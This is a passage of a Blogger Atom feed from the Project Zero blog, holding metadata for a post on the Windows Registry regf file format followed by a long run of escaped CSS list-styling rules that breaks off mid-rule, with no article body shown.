Tricks: Trapping Virtual Memory Access (2025 Update)'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-5470414558693895520</id><published>2024-12-19T11:03:00.000-08:00</published><updated>2025-02-27T09:17:21.461-08:00</updated><title type='text'>The Windows Registry Adventure #5: The regf file format</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=4mNYFHt_IKFsPe52toizHz0e5qzIIUg9OvSRGeMDk3I);.widget .post-body ul{padding: 0 0}ol.lst-kix_s8f9k49k9svk-8{list-style-type:none}ol.lst-kix_s8f9k49k9svk-7{list-style-type:none}ol.lst-kix_s8f9k49k9svk-6{list-style-type:none}ol.lst-kix_s8f9k49k9svk-5{list-style-type:none}ol.lst-kix_9i4egiire8k6-8.start{counter-reset:lst-ctn-kix_9i4egiire8k6-8 0}.lst-kix_82pihj16nguk-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_82pihj16nguk-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_82pihj16nguk-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_82pihj16nguk-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_2gqv10mkziv8-2{list-style-type:none}ul.lst-kix_2gqv10mkziv8-1{list-style-type:none}ul.lst-kix_2gqv10mkziv8-4{list-style-type:none}ul.lst-kix_2gqv10mkziv8-3{list-style-type:none}ul.lst-kix_2gqv10mkziv8-6{list-style-type:none}ul.lst-kix_2gqv10mkziv8-5{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-4.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-4 0}ul.lst-kix_2gqv10mkziv8-8{list-style-type:none}ul.lst-kix_2gqv10mkziv8-7{list-style-type:none}ol.lst-kix_fvisx24ngp1u-4.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-4 0}.lst-kix_82pihj16nguk-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_2gqv10mkziv8-0{list-style-type:none}.lst-kix_82pihj16nguk-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_s8f9k49k9svk-0{list-style-type:none}.lst-kix_s8f9k49k9svk-8&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-8}.lst-kix_rs477lwege9r-5&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-5}.lst-kix_9i4egiire8k6-4&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-4}ol.lst-kix_s8f9k49k9svk-4{list-style-type:none}ol.lst-kix_s8f9k49k9svk-3{list-style-type:none}ol.lst-kix_s8f9k49k9svk-2{list-style-type:none}ol.lst-kix_s8f9k49k9svk-1{list-style-type:none}.lst-kix_9iss8y571b2b-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_sxdyd6bfs1ox-6{list-style-type:none}ul.lst-kix_sxdyd6bfs1ox-7{list-style-type:none}.lst-kix_9iss8y571b2b-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_sxdyd6bfs1ox-8{list-style-type:none}.lst-kix_4ee45band27p-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4ee45band27p-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_sxdyd6bfs1ox-2{list-style-type:none}ul.lst-kix_sxdyd6bfs1ox-3{list-style-type:none}ul.lst-kix_sxdyd6bfs1ox-4{list-style-type:none}.lst-kix_4ee45band27p-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4ee45band27p-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_sxdyd6bfs1ox-5{list-style-type:none}.lst-kix_9iss8y571b2b-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_sxdyd6bfs1ox-0{list-style-type:none}ul.lst-kix_sxdyd6bfs1ox-1{list-style-type:none}.lst-kix_9iss8y571b2b-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4ee45band27p-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9iss8y571b2b-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_9iss8y571b2b-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4ee45band27p-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9iss8y571b2b-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9iss8y571b2b-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4ee45band27p-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4ee45band27p-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9iss8y571b2b-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4ee45band27p-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsnrn3gksa0-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_82pihj16nguk-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_82pihj16nguk-0,decimal) &quot;. &quot;}.lst-kix_82pihj16nguk-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsnrn3gksa0-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsnrn3gksa0-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_rs477lwege9r-1.start{counter-reset:lst-ctn-kix_rs477lwege9r-1 0}.lst-kix_82pihj16nguk-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsnrn3gksa0-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_gsnrn3gksa0-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rs477lwege9r-8.start{counter-reset:lst-ctn-kix_rs477lwege9r-8 0}ol.lst-kix_s8f9k49k9svk-3.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-3 0}.lst-kix_gsnrn3gksa0-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fvisx24ngp1u-0&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-0}.lst-kix_c8qgjiyn10ie-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_c8qgjiyn10ie-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsnrn3gksa0-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_c8qgjiyn10ie-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsnrn3gksa0-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsnrn3gksa0-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_88bs2bqozfm2-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_88bs2bqozfm2-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_c8qgjiyn10ie-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_sxdyd6bfs1ox-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_88bs2bqozfm2-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_s8f9k49k9svk-0.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-0 0}.lst-kix_gvci0hu7yb6k-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w06aeeqvjm56-3{list-style-type:none}.lst-kix_9i4egiire8k6-0&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-0}ul.lst-kix_w06aeeqvjm56-2{list-style-type:none}ul.lst-kix_w06aeeqvjm56-1{list-style-type:none}ul.lst-kix_w06aeeqvjm56-0{list-style-type:none}.lst-kix_c8qgjiyn10ie-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w06aeeqvjm56-7{list-style-type:none}.lst-kix_88bs2bqozfm2-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_w06aeeqvjm56-6{list-style-type:none}ul.lst-kix_w06aeeqvjm56-5{list-style-type:none}.lst-kix_gvci0hu7yb6k-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gvci0hu7yb6k-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_w06aeeqvjm56-4{list-style-type:none}.lst-kix_88bs2bqozfm2-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w06aeeqvjm56-8{list-style-type:none}.lst-kix_9fzrrhqm4j52-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_sxdyd6bfs1ox-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8f9k49k9svk-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-7,lower-latin) &quot;. &quot;}ol.lst-kix_9i4egiire8k6-1.start{counter-reset:lst-ctn-kix_9i4egiire8k6-1 0}.lst-kix_c8qgjiyn10ie-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9fzrrhqm4j52-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_sxdyd6bfs1ox-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s8f9k49k9svk-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-3,decimal) &quot;. &quot;}ol.lst-kix_9i4egiire8k6-7{list-style-type:none}ol.lst-kix_9i4egiire8k6-8{list-style-type:none}ol.lst-kix_9i4egiire8k6-5{list-style-type:none}ol.lst-kix_9i4egiire8k6-6{list-style-type:none}ol.lst-kix_9i4egiire8k6-3{list-style-type:none}ol.lst-kix_9i4egiire8k6-4{list-style-type:none}ol.lst-kix_9i4egiire8k6-1{list-style-type:none}ol.lst-kix_9i4egiire8k6-2{list-style-type:none}ol.lst-kix_9i4egiire8k6-0{list-style-type:none}.lst-kix_s8f9k49k9svk-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-5,lower-roman) &quot;. &quot;}.lst-kix_9fzrrhqm4j52-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sxdyd6bfs1ox-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_rs477lwege9r-2&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-2}.lst-kix_9fzrrhqm4j52-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gvci0hu7yb6k-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s8f9k49k9svk-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-1,lower-latin) &quot;. &quot;}.lst-kix_9fzrrhqm4j52-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9argrz9zfbv7-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s40msnqz5os7-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9argrz9zfbv7-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9argrz9zfbv7-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fvisx24ngp1u-4&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-4}.lst-kix_s40msnqz5os7-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_9i4egiire8k6-3.start{counter-reset:lst-ctn-kix_9i4egiire8k6-3 0}.lst-kix_s40msnqz5os7-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_9argrz9zfbv7-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_si5ikxnlj1q7-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s40msnqz5os7-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_rs477lwege9r-1&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-1}.lst-kix_9i4egiire8k6-5&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-5}.lst-kix_s5xocqmkj8s9-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-1,lower-latin) &quot;. &quot;}.lst-kix_s5xocqmkj8s9-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-3,decimal) &quot;. &quot;}.lst-kix_si5ikxnlj1q7-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_si5ikxnlj1q7-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s5xocqmkj8s9-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-7,lower-latin) &quot;. &quot;}.lst-kix_si5ikxnlj1q7-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8f9k49k9svk-4&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-4}ul.lst-kix_9iss8y571b2b-0{list-style-type:none}ul.lst-kix_9iss8y571b2b-3{list-style-type:none}ul.lst-kix_9iss8y571b2b-4{list-style-type:none}.lst-kix_30z58zep11nd-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_9iss8y571b2b-1{list-style-type:none}ul.lst-kix_9iss8y571b2b-2{list-style-type:none}ul.lst-kix_9iss8y571b2b-7{list-style-type:none}.lst-kix_s5xocqmkj8s9-2&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-2}ul.lst-kix_9iss8y571b2b-8{list-style-type:none}ul.lst-kix_9iss8y571b2b-5{list-style-type:none}ul.lst-kix_9iss8y571b2b-6{list-style-type:none}.lst-kix_s5xocqmkj8s9-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-5,lower-roman) &quot;. &quot;}ol.lst-kix_9i4egiire8k6-5.start{counter-reset:lst-ctn-kix_9i4egiire8k6-5 0}ol.lst-kix_s8f9k49k9svk-7.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-7 0}.lst-kix_3m5uvca0lm53-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_30z58zep11nd-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_30z58zep11nd-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3m5uvca0lm53-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rs477lwege9r-4.start{counter-reset:lst-ctn-kix_rs477lwege9r-4 0}.lst-kix_3m5uvca0lm53-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3m5uvca0lm53-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rs477lwege9r-6&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-6}ol.lst-kix_fvisx24ngp1u-7.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-7 0}.lst-kix_30z58zep11nd-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_30z58zep11nd-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_fvisx24ngp1u-1{list-style-type:none}ol.lst-kix_fvisx24ngp1u-0{list-style-type:none}ol.lst-kix_fvisx24ngp1u-3{list-style-type:none}ol.lst-kix_fvisx24ngp1u-2{list-style-type:none}ol.lst-kix_fvisx24ngp1u-1.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-1 0}ol.lst-kix_fvisx24ngp1u-8{list-style-type:none}ul.lst-kix_2w36zq8cd80k-8{list-style-type:none}ol.lst-kix_fvisx24ngp1u-5{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-7.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-7 0}ol.lst-kix_fvisx24ngp1u-4{list-style-type:none}.lst-kix_s5xocqmkj8s9-1&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-1}ol.lst-kix_fvisx24ngp1u-7{list-style-type:none}ol.lst-kix_fvisx24ngp1u-6{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-1.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-1 0}.lst-kix_l7ahywf1ghkc-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_s8f9k49k9svk-1.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-1 0}.lst-kix_l7ahywf1ghkc-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_s8f9k49k9svk-2.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-2 0}.lst-kix_s8f9k49k9svk-5&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-5}.lst-kix_9i4egiire8k6-3&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-3}ul.lst-kix_l7ahywf1ghkc-7{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-8{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-5{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-6{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-3{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-4{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-1{list-style-type:none}ul.lst-kix_l7ahywf1ghkc-2{list-style-type:none}.lst-kix_175jp61awd4f-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_l7ahywf1ghkc-0{list-style-type:none}ol.lst-kix_9i4egiire8k6-6.start{counter-reset:lst-ctn-kix_9i4egiire8k6-6 0}ul.lst-kix_9fzrrhqm4j52-6{list-style-type:none}.lst-kix_175jp61awd4f-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_9fzrrhqm4j52-5{list-style-type:none}ul.lst-kix_9fzrrhqm4j52-4{list-style-type:none}ul.lst-kix_88bs2bqozfm2-0{list-style-type:none}ol.lst-kix_fvisx24ngp1u-6.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-6 0}ul.lst-kix_9fzrrhqm4j52-3{list-style-type:none}ul.lst-kix_9fzrrhqm4j52-2{list-style-type:none}ol.lst-kix_82pihj16nguk-0.start{counter-reset:lst-ctn-kix_82pihj16nguk-0 0}ul.lst-kix_9fzrrhqm4j52-1{list-style-type:none}ul.lst-kix_9fzrrhqm4j52-0{list-style-type:none}.lst-kix_175jp61awd4f-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_s5xocqmkj8s9-2.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-2 0}.lst-kix_175jp61awd4f-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_9argrz9zfbv7-7{list-style-type:none}ul.lst-kix_9argrz9zfbv7-6{list-style-type:none}ul.lst-kix_9argrz9zfbv7-8{list-style-type:none}ul.lst-kix_9argrz9zfbv7-3{list-style-type:none}ul.lst-kix_88bs2bqozfm2-6{list-style-type:none}ul.lst-kix_9argrz9zfbv7-2{list-style-type:none}ul.lst-kix_88bs2bqozfm2-5{list-style-type:none}ul.lst-kix_9argrz9zfbv7-5{list-style-type:none}ul.lst-kix_88bs2bqozfm2-8{list-style-type:none}ul.lst-kix_9argrz9zfbv7-4{list-style-type:none}ul.lst-kix_88bs2bqozfm2-7{list-style-type:none}ul.lst-kix_88bs2bqozfm2-2{list-style-type:none}ul.lst-kix_88bs2bqozfm2-1{list-style-type:none}ul.lst-kix_9argrz9zfbv7-1{list-style-type:none}ul.lst-kix_9fzrrhqm4j52-8{list-style-type:none}ul.lst-kix_88bs2bqozfm2-4{list-style-type:none}ul.lst-kix_9argrz9zfbv7-0{list-style-type:none}ul.lst-kix_9fzrrhqm4j52-7{list-style-type:none}ul.lst-kix_88bs2bqozfm2-3{list-style-type:none}ol.lst-kix_fvisx24ngp1u-0.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-0 0}.lst-kix_s5xocqmkj8s9-6&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-6}.lst-kix_4ao7uanj5htj-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_88bs2bqozfm2-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fvisx24ngp1u-7&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-7}ol.lst-kix_s5xocqmkj8s9-8.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-8 0}.lst-kix_88bs2bqozfm2-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8f9k49k9svk-2&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-2}.lst-kix_gvci0hu7yb6k-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s8ghxl62e844-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sxdyd6bfs1ox-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iivgfpfdl0t3-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s8ghxl62e844-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s8f9k49k9svk-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-8,lower-roman) &quot;. &quot;}.lst-kix_c8qgjiyn10ie-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9fzrrhqm4j52-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sxdyd6bfs1ox-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_w06aeeqvjm56-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_s5xocqmkj8s9-5.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-5 0}ul.lst-kix_q9nppjnnwv68-1{list-style-type:none}.lst-kix_s8f9k49k9svk-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-4,lower-latin) &quot;. &quot;}ul.lst-kix_q9nppjnnwv68-0{list-style-type:none}ul.lst-kix_q9nppjnnwv68-3{list-style-type:none}ul.lst-kix_q9nppjnnwv68-2{list-style-type:none}.lst-kix_s8f9k49k9svk-0&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-0}.lst-kix_q9nppjnnwv68-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_q9nppjnnwv68-8{list-style-type:none}.lst-kix_s5xocqmkj8s9-4&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-4}ul.lst-kix_q9nppjnnwv68-5{list-style-type:none}ul.lst-kix_q9nppjnnwv68-4{list-style-type:none}.lst-kix_w06aeeqvjm56-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_q9nppjnnwv68-7{list-style-type:none}ol.lst-kix_s8f9k49k9svk-8.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-8 0}ul.lst-kix_q9nppjnnwv68-6{list-style-type:none}.lst-kix_iivgfpfdl0t3-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_2gqv10mkziv8-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4ao7uanj5htj-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_9fzrrhqm4j52-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9i4egiire8k6-1&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-1}ol.lst-kix_9i4egiire8k6-7.start{counter-reset:lst-ctn-kix_9i4egiire8k6-7 0}.lst-kix_q9nppjnnwv68-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q9nppjnnwv68-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_2gqv10mkziv8-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rs477lwege9r-3.start{counter-reset:lst-ctn-kix_rs477lwege9r-3 0}.lst-kix_gvci0hu7yb6k-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8ghxl62e844-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8f9k49k9svk-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-0,decimal) &quot;. &quot;}.lst-kix_4ao7uanj5htj-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rs477lwege9r-6.start{counter-reset:lst-ctn-kix_rs477lwege9r-6 0}.lst-kix_anetktcl8su5-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9argrz9zfbv7-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s40msnqz5os7-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pvxkc5ur63o3-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fvisx24ngp1u-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-4,lower-latin) &quot;. &quot;}.lst-kix_fvisx24ngp1u-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-8,lower-roman) &quot;. &quot;}.lst-kix_9i4egiire8k6-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-2,lower-roman) &quot;. &quot;}.lst-kix_9i4egiire8k6-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-6,decimal) &quot;. &quot;}.lst-kix_l7ahywf1ghkc-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_anetktcl8su5-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_2w36zq8cd80k-4{list-style-type:none}ul.lst-kix_2w36zq8cd80k-5{list-style-type:none}ol.lst-kix_s8f9k49k9svk-5.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-5 0}ul.lst-kix_2w36zq8cd80k-6{list-style-type:none}ol.lst-kix_rs477lwege9r-5.start{counter-reset:lst-ctn-kix_rs477lwege9r-5 0}ul.lst-kix_2w36zq8cd80k-7{list-style-type:none}ul.lst-kix_2w36zq8cd80k-0{list-style-type:none}ul.lst-kix_2w36zq8cd80k-1{list-style-type:none}ul.lst-kix_2w36zq8cd80k-2{list-style-type:none}ul.lst-kix_2w36zq8cd80k-3{list-style-type:none}.lst-kix_9argrz9zfbv7-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s40msnqz5os7-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l7ahywf1ghkc-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_fvisx24ngp1u-2.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-2 0}.lst-kix_si5ikxnlj1q7-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_3m5uvca0lm53-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_9i4egiire8k6-8&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-8}.lst-kix_rs477lwege9r-4&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-4}.lst-kix_s5xocqmkj8s9-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-0,decimal) &quot;. &quot;}.lst-kix_s5xocqmkj8s9-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-8,lower-roman) &quot;. &quot;}.lst-kix_si5ikxnlj1q7-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_fvisx24ngp1u-3.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-3 0}.lst-kix_s8f9k49k9svk-7&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-7}.lst-kix_fvisx24ngp1u-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-0,decimal) &quot;. &quot;}ol.lst-kix_s5xocqmkj8s9-6.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-6 0}ol.lst-kix_s8f9k49k9svk-6.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-6 0}.lst-kix_s40msnqz5os7-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pvxkc5ur63o3-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_30z58zep11nd-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s5xocqmkj8s9-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-4,lower-latin) &quot;. &quot;}.lst-kix_si5ikxnlj1q7-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rs477lwege9r-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-1,lower-latin) &quot;. &quot;}ul.lst-kix_gvci0hu7yb6k-1{list-style-type:none}ul.lst-kix_gvci0hu7yb6k-0{list-style-type:none}.lst-kix_rs477lwege9r-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-0,decimal) &quot;. &quot;}.lst-kix_rs477lwege9r-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-2,lower-roman) &quot;. &quot;}ul.lst-kix_gvci0hu7yb6k-3{list-style-type:none}ul.lst-kix_gvci0hu7yb6k-2{list-style-type:none}.lst-kix_rs477lwege9r-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-3,decimal) &quot;. &quot;}.lst-kix_rs477lwege9r-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-5,lower-roman) &quot;. &quot;}.lst-kix_9i4egiire8k6-6&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-6}ul.lst-kix_175jp61awd4f-0{list-style-type:none}.lst-kix_rs477lwege9r-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-4,lower-latin) &quot;. &quot;}.lst-kix_rs477lwege9r-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-6,decimal) &quot;. &quot;}ol.lst-kix_s8f9k49k9svk-4.start{counter-reset:lst-ctn-kix_s8f9k49k9svk-4 